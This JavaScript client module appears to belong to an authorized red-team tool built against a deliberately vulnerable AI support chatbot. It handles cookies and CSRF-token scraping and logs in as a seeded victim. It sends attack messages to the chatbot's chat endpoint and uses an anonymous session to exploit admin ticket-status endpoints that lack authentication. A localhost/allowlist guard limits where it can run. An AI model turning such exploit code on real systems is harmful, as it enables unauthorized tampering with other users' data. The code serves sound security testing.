// client.mjs — the one thing that actually talks to ai-security-chatbot. No adapter registry here
// (attacker-pro has one because it targets several kinds of app); this tool has exactly one real
// target, so this is a purpose-built client instead.
//
// Three things make this non-trivial, and all three are part of the story this tool tells:
//   1. Node's fetch doesn't persist cookies across calls — we keep a tiny manual cookie jar.
//   2. Most state-changing endpoints are CSRF-protected (Flask-WTF). A token is only ever handed out
//      embedded in an HTML page (<meta name="csrf-token">), tied to whatever session fetched that
//      page — so we scrape it like a browser would, not like an API client normally would.
//   3. The three admin ticket-mutation endpoints are CSRF-protected but carry NO auth decorator at
//      all — so a same-session-only ANONYMOUS visitor (one GET of any page, nothing more) already
//      holds a valid token for them. That's not a workaround; that's the vulnerability.

const BASE = (process.env.TARGET_URL || 'http://localhost:5000').replace(/\/$/, '');

function assertRoe(url) {
  const host = new URL(url).hostname;
  if (['localhost', '127.0.0.1', '::1'].includes(host)) return;
  if (process.env.ROE_AUTHORIZED === '1') {
    const allow = (process.env.TARGET_ALLOWLIST || '').split(',').map((s) => s.trim()).filter(Boolean);
    if (allow.includes(host)) return;
    throw new Error(`ROE: "${host}" is not on TARGET_ALLOWLIST (see rules-of-engagement.md)`);
  }
  throw new Error(`ROE: refusing non-localhost target "${host}" without ROE_AUTHORIZED=1 + TARGET_ALLOWLIST. See rules-of-engagement.md.`);
}
assertRoe(BASE);

class CookieJar {
  constructor() { this.map = new Map(); }
  absorb(res) {
    const cookies = typeof res.headers.getSetCookie === 'function'
      ? res.headers.getSetCookie()
      : (res.headers.get('set-cookie') ? [res.headers.get('set-cookie')] : []);
    for (const c of cookies) {
      const first = c.split(';')[0];
      const eq = first.indexOf('=');
      if (eq > 0) this.map.set(first.slice(0, eq).trim(), first.slice(eq + 1).trim());
    }
  }
  header() { return [...this.map.entries()].map(([k, v]) => `${k}=${v}`).join('; '); }
}

export class Client {
  constructor() {
    this.anonJar = new CookieJar();    // a fresh, never-logged-in "visitor" session
    this.victimJar = new CookieJar();  // the seeded victim's authenticated session
    this.anonCsrf = null;
    this.victimCsrf = null;
  }

  async _fetch(path, { method = 'GET', jar, body, csrf } = {}) {
    const headers = {};
    if (jar) { const c = jar.header(); if (c) headers.Cookie = c; }
    if (body !== undefined) headers['Content-Type'] = 'application/json';
    if (csrf) headers['X-CSRFToken'] = csrf;
    const res = await fetch(`${BASE}${path}`, { method, headers, body: body !== undefined ? JSON.stringify(body) : undefined });
    if (jar) jar.absorb(res);
    return res;
  }

  // GET any page to establish/refresh a session and scrape its CSRF token — the token is tied to
  // whichever session the jar currently holds (anonymous, or the victim's, once logged in).
  async primeCsrf(jar, path = '/') {
    const res = await this._fetch(path, { jar });
    const html = await res.text();
    const m = /<meta\s+name=["']csrf-token["']\s+content=["']([^"']+)["']/i.exec(html);
    return m ? m[1] : null;
  }

  async anonymousSession() {
    if (!this.anonCsrf) this.anonCsrf = await this.primeCsrf(this.anonJar, '/');
    return { jar: this.anonJar, csrf: this.anonCsrf };
  }

  async health() {
    const res = await this._fetch('/api/health');
    return res.ok ? res.json() : null;
  }

  async configuredModel() {
    const res = await this._fetch('/api/configured-model');
    const data = await res.json().catch(() => ({}));
    return data.model || 'unknown';
  }

  async loginAsVictim(email, password) {
    await this.primeCsrf(this.victimJar, '/'); // a session must exist before /api/login can set user_id on it
    const res = await this._fetch('/api/login', { method: 'POST', jar: this.victimJar, body: { email, password } });
    const data = await res.json().catch(() => ({}));
    if (!res.ok || !data.success) throw new Error(`victim login failed (${res.status}): ${JSON.stringify(data)}`);
    this.victimCsrf = await this.primeCsrf(this.victimJar, '/tickets');
    return data.user;
  }

  // THE attack surface. `authenticated: true` sends the victim's own cookie (for the one strategy
  // that needs it); everything else runs with no session at all — zero accounts, zero cookies.
  async chat(message, { authenticated = false, conversationId = null } = {}) {
    const jar = authenticated ? this.victimJar : null;
    const res = await this._fetch('/api/chat', { method: 'POST', jar, body: { message, conversation_id: conversationId } });
    const data = await res.json().catch(() => ({}));
    return { status: res.status, ok: res.ok, text: data.response ?? '', conversationId: data.conversation_id ?? conversationId, raw: data };
  }

  // NOTE: the create response does NOT include the internal numeric id (confirmed against the live
  // API — docs/api.md documents a `ticket_id` field that the real implementation doesn't return).
  // The scoped read-back below is the only place that id shows up, so we fetch it immediately.
  async createVictimTicket({ subject, description, priority = 'medium' }) {
    const res = await this._fetch('/api/tickets/create', { method: 'POST', jar: this.victimJar, csrf: this.victimCsrf, body: { subject, description, priority } });
    const data = await res.json().catch(() => ({}));
    if (!res.ok || !data.success) throw new Error(`ticket create failed (${res.status}): ${JSON.stringify(data)}`);
    const ticket = await this.readTicketAsVictim(data.ticket_number);
    if (!ticket) throw new Error(`created ${data.ticket_number} but could not read it back to get its internal id`);
    return { ticketNumber: data.ticket_number, ticketId: ticket.id };
  }

  // The properly-scoped REST read (only the owner can use this one) — used to PROVE a flag-based
  // finding by checking real state through a *different, legitimately-scoped* path than the attack.
  // Also the only place the ticket's internal numeric id is ever exposed (see note above).
  async readTicketAsVictim(ticketNumber) {
    const res = await this._fetch(`/api/tickets/${ticketNumber}`, { jar: this.victimJar });
    const data = await res.json().catch(() => ({}));
    return data.ticket || null;
  }

  // The vulnerability itself: these three carry CSRF protection but NO auth decorator at all, so
  // one anonymous session (a single prior GET, nothing more) is enough to use them.
  async adminMutateStatus(ticketId, status, resolutionNotes) {
    const { jar, csrf } = await this.anonymousSession();
    const res = await this._fetch(`/api/admin/tickets/${ticketId}/status`, { method: 'PUT', jar, csrf, body: { status, resolution_notes: resolutionNotes } });
    const data = await res.json().catch(() => ({}));
    return { status: res.status, ok: res.ok, raw: data };
  }
}
